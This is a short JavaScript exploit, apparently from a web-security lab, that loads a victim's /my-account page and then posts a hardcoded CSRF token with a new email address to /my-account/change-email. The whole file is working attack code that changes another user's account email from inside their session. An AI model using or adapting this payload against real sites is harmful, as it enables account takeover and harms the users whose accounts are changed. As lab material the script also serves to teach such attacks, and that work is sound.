var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
    // from exploit.js
    var token = 'LO6IIVfTr0QcaBs1K9vcWru1glKX7mEi';
    var changeReq = new XMLHttpRequest();

    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com');
};